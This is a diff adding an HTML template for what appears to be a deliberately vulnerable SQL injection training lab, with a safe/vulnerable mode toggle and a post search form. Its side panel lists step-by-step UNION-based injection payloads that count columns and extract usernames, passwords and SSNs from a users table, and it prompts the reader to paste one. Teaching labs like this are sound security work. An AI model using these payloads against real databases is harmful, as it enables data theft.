@@ -1,0 +1,80 @@
+{% extends "base.html" %}
+{% block title %}SQLi — UNION Extract{% endblock %}
+{% block content %}
+
+<h1 class="page-title">SQL Injection — UNION-Based Extraction</h1>
+<p class="page-subtitle">A03:2021 · Append UNION SELECT to pull data from any table</p>
+
+<div class="mode-banner {{ 'safe' if safe else 'vuln' }}">
+  <span class="badge">{{ 'SAFE MODE' if safe else 'VULNERABLE' }}</span>
+  {% if safe %}Parameterised query — UNION injection not possible.
+  {% else %}Raw string concatenation — UNION payload executes against DB.{% endif %}
+  <button onclick="toggleSafe()" class="btn {{ 'btn-red' if safe else 'btn-green' }}" style="margin-left:auto;font-size:11px;padding:0.3rem 0.8rem;">Switch to {{ 'Vulnerable' if safe else 'Safe' }} Mode</button>
+</div>
+
+<div class="split">
+  <div>
+    <div class="card">
+      <div class="card-header"><span>🔍</span><span class="card-title">Post Search</span></div>
+      <form method="GET" action="/sqli/search">
+        <input name="safe" type="hidden" value="{{ '1' if safe else '0' }}">
+        <div style="display:flex;gap:0.75rem;">
+          <input name="q" class="form-input" placeholder="search posts..." value="{{ q }}">
+          <button type="submit" class="btn btn-green">Search</button>
+        </div>
+      </form>
+
+      {% if query_shown %}
+      <div style="margin-top:1rem;">
+        <div style="font-size:11px;color:var(--gray);margin-bottom:0.35rem;">Executed query:</div>
+        <div class="query-display">{{ query_shown }}</div>
+      </div>
+      {% endif %}
+
+      {% if error %}
+      <div class="alert alert-danger">DB Error: {{ error }}</div>
+      {% endif %}
+
+      {% if results %}
+      <div style="margin-top:1rem;">
+        <div style="font-size:11px;color:var(--gray);margin-bottom:0.5rem;">{{ results|length }} result(s):</div>
+        {% for row in results %}
+        <div style="background:#010409;border:1px solid var(--border);border-radius:5px;padding:0.75rem;margin-bottom:0.5rem;">
+          {% for k,v in row.items() %}
+          <div style="font-size:12px;"><span style="color:var(--gray);">{{ k }}:</span> <span style="color:{% if k == 'password' or k == 'ssn' %}var(--red){% else %}var(--green){% endif %};">{{ v }}</span></div>
+          {% endfor %}
+        </div>
+        {% endfor %}
+      </div>
+      {% elif q %}
+      <div class="alert alert-warn">No posts found for "{{ q }}"</div>
+      {% endif %}
+    </div>
+  </div>
+
+  <div>
+    <div class="card">
+      <div class="card-header"><span>💡</span><span class="card-title">UNION Attack Steps</span></div>
+
+      {% set steps = [
+        ("Step 1 — Count columns", "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--  ← error here = 3 columns\nOR: ' UNION SELECT NULL,NULL,NULL--"),
+        ("Step 2 — Find string col", "' UNION SELECT 'a',NULL,NULL--\n' UNION SELECT NULL,'a',NULL--  ← 'a' in output = col 2 is string"),
+        ("Step 3 — Extract users", "' UNION SELECT NULL,username,password FROM users--"),
+        ("Step 4 — Get all data", "' UNION SELECT NULL,username||':'||password||':'||ssn,email FROM users--"),
+      ] %}
+
+      {% for title, code in steps %}
+      <div style="margin-bottom:1rem;">
+        <div style="font-size:11px;font-weight:700;color:var(--yellow);margin-bottom:0.35rem;">{{ title }}</div>
+        <div class="code-block" style="font-size:11px;">{{ code }}</div>
+      </div>
+      {% endfor %}
+
+      <div class="alert alert-info">
+        <strong>Try now:</strong> Paste <code style="color:var(--red);">' UNION SELECT NULL,username,password FROM users--</code> into the search box in vulnerable mode.
+      </div>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
